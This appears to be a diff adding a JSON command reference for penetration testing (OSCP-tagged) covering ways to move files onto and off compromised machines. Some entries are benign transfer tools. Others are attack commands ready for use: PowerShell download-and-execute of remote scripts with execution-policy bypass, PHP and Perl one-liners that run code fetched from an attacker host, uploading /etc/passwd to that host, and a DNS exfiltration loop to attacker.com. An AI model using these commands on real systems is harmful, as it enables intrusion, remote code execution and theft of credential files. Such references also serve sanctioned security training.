@@ -1,0 +1,751 @@
+{
+  "category": "file-transfer",
+  "description": "File transfer methods for various scenarios",
+  "commands": [
+    {
+      "id": "python-http-server",
+      "name": "Python HTTP Server",
+      "category": "file-transfer",
+      "command": "python3 -m http.server <PORT>",
+      "description": "Start simple HTTP server for file transfers",
+      "tags": ["TRANSFER", "HTTP", "QUICK_WIN", "OSCP:HIGH"],
+      "variables": [
+        {
+          "name": "<PORT>",
+          "description": "Port to serve on",
+          "example": "8000",
+          "required": false
+        }
+      ],
+      "flag_explanations": {
+        "-m": "Run module as main program",
+        "http.server": "Built-in HTTP server module",
+        "8000": "Default port if not specified"
+      },
+      "success_indicators": [
+        "Serving HTTP on",
+        "GET request received",
+        "200 OK response"
+      ],
+      "failure_indicators": [
+        "Address already in use",
+        "Permission denied",
+        "Module not found"
+      ],
+      "next_steps": [
+        "Download from target: wget http://<LHOST>:<PORT>/file",
+        "Windows download: certutil -urlcache -f http://<LHOST>:<PORT>/file file",
+        "PowerShell: Invoke-WebRequest http://<LHOST>:<PORT>/file -OutFile file",
+        "Curl: curl http://<LHOST>:<PORT>/file -o file"
+      ],
+      "alternatives": ["python2 -m SimpleHTTPServer <PORT>", "php -S 0.0.0.0:<PORT>", "ruby -run -e httpd . -p <PORT>"],
+      "notes": "Serves files from current directory",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "wget-download",
+      "name": "Wget Download",
+      "category": "file-transfer",
+      "command": "wget http://<LHOST>:<PORT>/<FILE> -O <OUTPUT>",
+      "description": "Download file using wget",
+      "tags": ["TRANSFER", "LINUX", "OSCP:HIGH"],
+      "variables": [
+        {
+          "name": "<LHOST>",
+          "description": "Server IP address",
+          "example": "10.10.14.5",
+          "required": true
+        },
+        {
+          "name": "<PORT>",
+          "description": "Server port",
+          "example": "8000",
+          "required": true
+        },
+        {
+          "name": "<FILE>",
+          "description": "File to download",
+          "example": "linpeas.sh",
+          "required": true
+        },
+        {
+          "name": "<OUTPUT>",
+          "description": "Output filename",
+          "example": "linpeas.sh",
+          "required": false
+        }
+      ],
+      "flag_explanations": {
+        "-O": "Output filename (capital O)",
+        "-q": "Quiet mode",
+        "--no-check-certificate": "Skip SSL verification",
+        "-r": "Recursive download"
+      },
+      "success_indicators": [
+        "100%",
+        "saved",
+        "200 OK"
+      ],
+      "failure_indicators": [
+        "Connection refused",
+        "404 Not Found",
+        "No route to host"
+      ],
+      "next_steps": [
+        "Make executable: chmod +x <FILE>",
+        "Verify integrity: md5sum <FILE>",
+        "Execute: ./<FILE>",
+        "Background download: wget -b <URL>"
+      ],
+      "alternatives": ["curl -O http://<LHOST>:<PORT>/<FILE>", "fetch http://<LHOST>:<PORT>/<FILE>"],
+      "notes": "Available on most Linux systems",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "curl-upload",
+      "name": "Curl File Upload",
+      "category": "file-transfer",
+      "command": "curl -X POST -F 'file=@<FILE>' http://<LHOST>:<PORT>/upload",
+      "description": "Upload file using curl",
+      "tags": ["TRANSFER", "UPLOAD", "OSCP:HIGH"],
+      "variables": [
+        {
+          "name": "<FILE>",
+          "description": "File to upload",
+          "example": "/etc/passwd",
+          "required": true
+        },
+        {
+          "name": "<LHOST>",
+          "description": "Server IP",
+          "example": "10.10.14.5",
+          "required": true
+        },
+        {
+          "name": "<PORT>",
+          "description": "Server port",
+          "example": "8000",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "-X POST": "Use POST method",
+        "-F": "Form data with file upload",
+        "@": "Read from file",
+        "-d": "Send data (alternative)"
+      },
+      "success_indicators": [
+        "100 Continue",
+        "200 OK",
+        "Upload successful"
+      ],
+      "failure_indicators": [
+        "Connection refused",
+        "413 Entity Too Large",
+        "404 Not Found"
+      ],
+      "next_steps": [
+        "Setup receiver: python3 -m uploadserver",
+        "Alternative: nc -l -p <PORT> > file",
+        "PHP receiver: file_put_contents('upload.txt', file_get_contents('php://input'))",
+        "Check upload: ls -la uploaded_file"
+      ],
+      "alternatives": ["curl --upload-file <FILE> http://<LHOST>:<PORT>/", "curl -T <FILE> ftp://<LHOST>/"],
+      "notes": "Requires upload handler on server",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "certutil-download",
+      "name": "Certutil Windows Download",
+      "category": "file-transfer",
+      "command": "certutil -urlcache -f http://<LHOST>:<PORT>/<FILE> <OUTPUT>",
+      "description": "Download files on Windows using certutil",
+      "tags": ["TRANSFER", "WINDOWS", "OSCP:HIGH"],
+      "variables": [
+        {
+          "name": "<LHOST>",
+          "description": "Server IP",
+          "example": "10.10.14.5",
+          "required": true
+        },
+        {
+          "name": "<PORT>",
+          "description": "Server port",
+          "example": "8000",
+          "required": true
+        },
+        {
+          "name": "<FILE>",
+          "description": "File to download",
+          "example": "shell.exe",
+          "required": true
+        },
+        {
+          "name": "<OUTPUT>",
+          "description": "Output filename",
+          "example": "shell.exe",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "-urlcache": "Use URL cache",
+        "-f": "Force fetch from URL",
+        "-split": "Split large files"
+      },
+      "success_indicators": [
+        "CertUtil: -URLCache command completed successfully",
+        "****",
+        "OK"
+      ],
+      "failure_indicators": [
+        "0x80070002",
+        "The network path was not found",
+        "Access denied"
+      ],
+      "next_steps": [
+        "Verify download: dir <OUTPUT>",
+        "Execute: .\\<OUTPUT>",
+        "Alternative encoding: certutil -encode file.exe file.txt",
+        "Decode: certutil -decode file.txt file.exe"
+      ],
+      "alternatives": ["bitsadmin /transfer job http://<LHOST>/<FILE> C:\\temp\\<FILE>", "powershell wget http://<LHOST>/<FILE> -OutFile <FILE>"],
+      "notes": "Built into Windows, often not blocked",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "powershell-download",
+      "name": "PowerShell Download Methods",
+      "category": "file-transfer",
+      "command": "powershell -c \"Invoke-WebRequest -Uri http://<LHOST>:<PORT>/<FILE> -OutFile <OUTPUT>\"",
+      "description": "Download files using PowerShell",
+      "tags": ["TRANSFER", "WINDOWS", "POWERSHELL", "OSCP:HIGH"],
+      "variables": [
+        {
+          "name": "<LHOST>",
+          "description": "Server IP",
+          "example": "10.10.14.5",
+          "required": true
+        },
+        {
+          "name": "<PORT>",
+          "description": "Server port",
+          "example": "8000",
+          "required": true
+        },
+        {
+          "name": "<FILE>",
+          "description": "File to download",
+          "example": "shell.ps1",
+          "required": true
+        },
+        {
+          "name": "<OUTPUT>",
+          "description": "Output filename",
+          "example": "shell.ps1",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "-c": "Execute command",
+        "Invoke-WebRequest": "PowerShell web cmdlet",
+        "-Uri": "Target URL",
+        "-OutFile": "Save to file"
+      },
+      "success_indicators": [
+        "StatusCode : 200",
+        "File created",
+        "Download complete"
+      ],
+      "failure_indicators": [
+        "Unable to connect",
+        "404 Not Found",
+        "Access denied"
+      ],
+      "next_steps": [
+        "Execute in memory: IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>')",
+        "Download and execute: powershell -exec bypass -c \"IEX(IWR http://<LHOST>/<FILE> -UseBasicParsing)\"",
+        "Alternative: (New-Object System.Net.WebClient).DownloadFile('http://<LHOST>/<FILE>','<OUTPUT>')",
+        "Base64 encode: [Convert]::ToBase64String([IO.File]::ReadAllBytes('<FILE>'))"
+      ],
+      "alternatives": ["powershell wget http://<LHOST>/<FILE>", "powershell curl http://<LHOST>/<FILE>"],
+      "notes": "IWR alias for Invoke-WebRequest",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "smb-server",
+      "name": "Impacket SMB Server",
+      "category": "file-transfer",
+      "command": "impacket-smbserver share . -smb2support",
+      "description": "Start SMB server for file transfers",
+      "tags": ["TRANSFER", "SMB", "WINDOWS", "OSCP:HIGH"],
+      "variables": [],
+      "flag_explanations": {
+        "share": "Share name",
+        ".": "Current directory to share",
+        "-smb2support": "Enable SMB2 protocol",
+        "-username": "Set authentication"
+      },
+      "success_indicators": [
+        "Impacket SMB Server",
+        "Listening on",
+        "Incoming connection"
+      ],
+      "failure_indicators": [
+        "Address already in use",
+        "Permission denied",
+        "SMB SessionError"
+      ],
+      "next_steps": [
+        "Windows access: net use \\\\<LHOST>\\share",
+        "Copy file: copy \\\\<LHOST>\\share\\file.exe C:\\temp\\",
+        "Execute directly: \\\\<LHOST>\\share\\file.exe",
+        "List files: dir \\\\<LHOST>\\share"
+      ],
+      "alternatives": ["python3 smbserver.py share .", "samba service"],
+      "notes": "No authentication by default",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "nc-file-transfer",
+      "name": "Netcat File Transfer",
+      "category": "file-transfer",
+      "command": "nc -l -p <LPORT> > <FILE>",
+      "description": "Receive file using netcat",
+      "tags": ["TRANSFER", "NETCAT", "OSCP:HIGH"],
+      "variables": [
+        {
+          "name": "<LPORT>",
+          "description": "Listen port",
+          "example": "4444",
+          "required": true
+        },
+        {
+          "name": "<FILE>",
+          "description": "Output filename",
+          "example": "received_file",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "-l": "Listen mode",
+        "-p": "Port number",
+        ">": "Redirect to file",
+        "-v": "Verbose output"
+      },
+      "success_indicators": [
+        "Connection from",
+        "File size increases",
+        "Connection closed"
+      ],
+      "failure_indicators": [
+        "Address already in use",
+        "Connection refused",
+        "nc: command not found"
+      ],
+      "next_steps": [
+        "Send from target: nc <LHOST> <LPORT> < file",
+        "Send from Windows: type file | nc <LHOST> <LPORT>",
+        "Verify transfer: md5sum <FILE>",
+        "Compressed transfer: tar czf - /path | nc <LHOST> <LPORT>"
+      ],
+      "alternatives": ["socat TCP-LISTEN:<LPORT> file:<FILE>,create", "ncat -l <LPORT> > <FILE>"],
+      "notes": "Simple but no progress indication",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "base64-transfer",
+      "name": "Base64 Encoding Transfer",
+      "category": "file-transfer",
+      "command": "base64 -w0 <FILE> | nc <LHOST> <LPORT>",
+      "description": "Transfer files using base64 encoding",
+      "tags": ["TRANSFER", "ENCODING", "OSCP:HIGH"],
+      "variables": [
+        {
+          "name": "<FILE>",
+          "description": "File to encode",
+          "example": "binary.exe",
+          "required": true
+        },
+        {
+          "name": "<LHOST>",
+          "description": "Receiver IP",
+          "example": "10.10.14.5",
+          "required": true
+        },
+        {
+          "name": "<LPORT>",
+          "description": "Receiver port",
+          "example": "4444",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "-w0": "Disable line wrapping",
+        "-d": "Decode mode",
+        "|": "Pipe to netcat"
+      },
+      "success_indicators": [
+        "Base64 output",
+        "Transfer complete",
+        "Successful decode"
+      ],
+      "failure_indicators": [
+        "Invalid input",
+        "Connection refused",
+        "Decode error"
+      ],
+      "next_steps": [
+        "Receive and decode: nc -l <LPORT> | base64 -d > file",
+        "Copy paste method: base64 <FILE> then copy output",
+        "Windows decode: certutil -decode input.txt output.exe",
+        "PowerShell decode: [System.Convert]::FromBase64String($data)"
+      ],
+      "alternatives": ["xxd -p <FILE>", "od -An -tx1 <FILE>", "hexdump -ve '1/1 \"%.2x\"' <FILE>"],
+      "notes": "Useful for binary files over text protocols",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "ftp-transfer",
+      "name": "FTP File Transfer",
+      "category": "file-transfer",
+      "command": "python3 -m pyftpdlib -p 21 -w",
+      "description": "Start FTP server for file transfers",
+      "tags": ["TRANSFER", "FTP", "OSCP:MEDIUM"],
+      "variables": [],
+      "flag_explanations": {
+        "-p": "Port number",
+        "-w": "Allow write/upload",
+        "-d": "Directory to serve",
+        "-u": "Username"
+      },
+      "success_indicators": [
+        "FTP server started",
+        "Listening on",
+        "User logged in"
+      ],
+      "failure_indicators": [
+        "Module not found",
+        "Permission denied",
+        "Address in use"
+      ],
+      "next_steps": [
+        "Windows FTP: ftp <LHOST>",
+        "Download: ftp> get file.exe",
+        "Upload: ftp> put file.txt",
+        "Script FTP: echo 'get file' | ftp -n <LHOST>"
+      ],
+      "alternatives": ["service vsftpd start", "python -m SimpleHTTPServer"],
+      "notes": "Install: pip install pyftpdlib",
+      "oscp_relevance": "medium"
+    },
+    {
+      "id": "scp-transfer",
+      "name": "SCP Secure Copy",
+      "category": "file-transfer",
+      "command": "scp <FILE> <USERNAME>@<TARGET>:/tmp/",
+      "description": "Secure copy over SSH",
+      "tags": ["TRANSFER", "SSH", "SECURE", "OSCP:MEDIUM"],
+      "variables": [
+        {
+          "name": "<FILE>",
+          "description": "File to transfer",
+          "example": "exploit.sh",
+          "required": true
+        },
+        {
+          "name": "<USERNAME>",
+          "description": "SSH username",
+          "example": "user",
+          "required": true
+        },
+        {
+          "name": "<TARGET>",
+          "description": "Target IP",
+          "example": "192.168.1.100",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "-r": "Recursive for directories",
+        "-P": "Port specification",
+        "-i": "Identity file (SSH key)",
+        "-o": "SSH options"
+      },
+      "success_indicators": [
+        "100%",
+        "Transfer complete",
+        "Bytes transferred"
+      ],
+      "failure_indicators": [
+        "Permission denied",
+        "Connection refused",
+        "No route to host"
+      ],
+      "next_steps": [
+        "Download from target: scp <USERNAME>@<TARGET>:/path/file .",
+        "Use SSH key: scp -i id_rsa file <USERNAME>@<TARGET>:/tmp/",
+        "Custom port: scp -P 2222 file <USERNAME>@<TARGET>:/tmp/",
+        "Recursive copy: scp -r folder/ <USERNAME>@<TARGET>:/tmp/"
+      ],
+      "alternatives": ["rsync -avz file <USERNAME>@<TARGET>:/tmp/", "sftp <USERNAME>@<TARGET>"],
+      "notes": "Requires SSH credentials",
+      "oscp_relevance": "medium"
+    },
+    {
+      "id": "php-download",
+      "name": "PHP Download Script",
+      "category": "file-transfer",
+      "command": "<?php file_put_contents('<FILE>', file_get_contents('http://<LHOST>:<PORT>/<FILE>')); ?>",
+      "description": "Download file using PHP",
+      "tags": ["TRANSFER", "WEB", "PHP", "OSCP:HIGH"],
+      "variables": [
+        {
+          "name": "<FILE>",
+          "description": "Output filename",
+          "example": "shell.php",
+          "required": true
+        },
+        {
+          "name": "<LHOST>",
+          "description": "Server IP",
+          "example": "10.10.14.5",
+          "required": true
+        },
+        {
+          "name": "<PORT>",
+          "description": "Server port",
+          "example": "8000",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "file_get_contents": "Read file/URL content",
+        "file_put_contents": "Write content to file",
+        "fopen": "Alternative function"
+      },
+      "success_indicators": [
+        "File created",
+        "True returned",
+        "Bytes written"
+      ],
+      "failure_indicators": [
+        "Warning: failed to open",
+        "Permission denied",
+        "Function disabled"
+      ],
+      "next_steps": [
+        "One-liner: php -r \"file_put_contents('f',file_get_contents('http://<LHOST>/f'));\"",
+        "Execute: php -r \"system(file_get_contents('http://<LHOST>/cmd.txt'));\"",
+        "Upload: php -r \"file_put_contents('ftp://<LHOST>/file',file_get_contents('/etc/passwd'));\"",
+        "Base64: php -r \"file_put_contents('f',base64_decode(file_get_contents('http://<LHOST>/f.b64')));\""
+      ],
+      "alternatives": ["wget via PHP: <?php system('wget http://<LHOST>/<FILE>'); ?>", "curl via PHP: <?php system('curl -O http://<LHOST>/<FILE>'); ?>"],
+      "notes": "Works in web shells",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "perl-download",
+      "name": "Perl Download",
+      "category": "file-transfer",
+      "command": "perl -e 'use LWP::Simple; getstore(\"http://<LHOST>:<PORT>/<FILE>\", \"<OUTPUT>\");'",
+      "description": "Download file using Perl",
+      "tags": ["TRANSFER", "PERL", "OSCP:MEDIUM"],
+      "variables": [
+        {
+          "name": "<LHOST>",
+          "description": "Server IP",
+          "example": "10.10.14.5",
+          "required": true
+        },
+        {
+          "name": "<PORT>",
+          "description": "Server port",
+          "example": "8000",
+          "required": true
+        },
+        {
+          "name": "<FILE>",
+          "description": "File to download",
+          "example": "exploit.pl",
+          "required": true
+        },
+        {
+          "name": "<OUTPUT>",
+          "description": "Output filename",
+          "example": "exploit.pl",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "-e": "Execute Perl code",
+        "LWP::Simple": "Web client module",
+        "getstore": "Download and save function"
+      },
+      "success_indicators": [
+        "200",
+        "File created",
+        "OK"
+      ],
+      "failure_indicators": [
+        "Can't locate LWP",
+        "404",
+        "Connection refused"
+      ],
+      "next_steps": [
+        "Make executable: chmod +x <OUTPUT>",
+        "Alternative module: use HTTP::Tiny",
+        "Execute downloaded: perl <OUTPUT>",
+        "One-liner exec: perl -e 'system(qx{curl http://<LHOST>/cmd})'"
+      ],
+      "alternatives": ["perl -e 'use File::Fetch; File::Fetch->new(uri=>\"http://<LHOST>/<FILE>\")->fetch();'"],
+      "notes": "LWP module may not be installed",
+      "oscp_relevance": "medium"
+    },
+    {
+      "id": "vbscript-download",
+      "name": "VBScript Download (Windows)",
+      "category": "file-transfer",
+      "command": "echo Set x=CreateObject(\"Microsoft.XMLHTTP\"):x.Open \"GET\",\"http://<LHOST>:<PORT>/<FILE>\",0:x.Send:Set s=CreateObject(\"ADODB.Stream\"):s.Type=1:s.Open:s.Write x.ResponseBody:s.SaveToFile \"<OUTPUT>\",2 > dl.vbs && cscript //nologo dl.vbs",
+      "description": "Download file using VBScript on older Windows",
+      "tags": ["TRANSFER", "WINDOWS", "LEGACY", "OSCP:MEDIUM"],
+      "variables": [
+        {
+          "name": "<LHOST>",
+          "description": "Server IP",
+          "example": "10.10.14.5",
+          "required": true
+        },
+        {
+          "name": "<PORT>",
+          "description": "Server port",
+          "example": "8000",
+          "required": true
+        },
+        {
+          "name": "<FILE>",
+          "description": "File to download",
+          "example": "shell.exe",
+          "required": true
+        },
+        {
+          "name": "<OUTPUT>",
+          "description": "Output filename",
+          "example": "shell.exe",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "Microsoft.XMLHTTP": "HTTP client object",
+        "ADODB.Stream": "Binary stream object",
+        "cscript": "Command line script host",
+        "//nologo": "Suppress banner"
+      },
+      "success_indicators": [
+        "Download complete",
+        "File created",
+        "Script finished"
+      ],
+      "failure_indicators": [
+        "ActiveX component can't create",
+        "Access denied",
+        "Invalid procedure"
+      ],
+      "next_steps": [
+        "Execute downloaded: .\\<OUTPUT>",
+        "Delete script: del dl.vbs",
+        "Alternative host: wscript dl.vbs",
+        "Check file: dir <OUTPUT>"
+      ],
+      "alternatives": ["bitsadmin for newer Windows", "certutil for Windows 7+"],
+      "notes": "Works on Windows XP/2003",
+      "oscp_relevance": "medium"
+    },
+    {
+      "id": "debug-exe-transfer",
+      "name": "Debug.exe File Creation (Windows)",
+      "category": "file-transfer",
+      "command": "upx -9 <FILE> && exe2hex -x <FILE> -p <FILE>.cmd",
+      "description": "Convert binary to debug.exe script for Windows XP/2003",
+      "tags": ["TRANSFER", "WINDOWS", "LEGACY", "OSCP:LOW"],
+      "variables": [
+        {
+          "name": "<FILE>",
+          "description": "Binary file",
+          "example": "nc.exe",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "upx -9": "Compress binary (max compression)",
+        "exe2hex": "Convert to debug script",
+        "-x": "Input exe file",
+        "-p": "Output cmd/powershell"
+      },
+      "success_indicators": [
+        "Packed",
+        "Script created",
+        "File assembled"
+      ],
+      "failure_indicators": [
+        "File too large",
+        "Compression failed",
+        "debug.exe not found"
+      ],
+      "next_steps": [
+        "Transfer script content via copy/paste",
+        "Execute on target: debug < script.txt",
+        "Alternative: copy con file.txt then paste",
+        "Verify: fc /b original.exe created.exe"
+      ],
+      "alternatives": ["certutil base64 encoding", "PowerShell byte array"],
+      "notes": "Limited to 64KB files",
+      "oscp_relevance": "low"
+    },
+    {
+      "id": "dns-exfiltration",
+      "name": "DNS Exfiltration",
+      "category": "file-transfer",
+      "command": "cat <FILE> | xxd -p | while read line; do nslookup $line.<DOMAIN>; done",
+      "description": "Exfiltrate data via DNS queries",
+      "tags": ["TRANSFER", "EXFILTRATION", "STEALTH", "OSCP:LOW"],
+      "variables": [
+        {
+          "name": "<FILE>",
+          "description": "File to exfiltrate",
+          "example": "/etc/passwd",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN>",
+          "description": "DNS domain you control",
+          "example": "attacker.com",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "xxd -p": "Convert to hex",
+        "nslookup": "DNS query tool",
+        "while read": "Process line by line"
+      },
+      "success_indicators": [
+        "DNS queries sent",
+        "Server replies",
+        "Data in DNS logs"
+      ],
+      "failure_indicators": [
+        "NXDOMAIN",
+        "Connection timed out",
+        "Query refused"
+      ],
+      "next_steps": [
+        "Setup DNS server: dnsmasq --no-daemon --log-queries",
+        "Alternative: use dnscat2 for tunneling",
+        "Powershell: Resolve-DnsName \"$data.attacker.com\"",
+        "Extract from logs: grep -oP '(?<=query\\[A\\] )[^.]+' dns.log"
+      ],
+      "alternatives": ["dig $data.attacker.com", "host $data.attacker.com", "ping $data.attacker.com"],
+      "notes": "Slow but stealthy",
+      "oscp_relevance": "low"
+    }
+  ]
+}
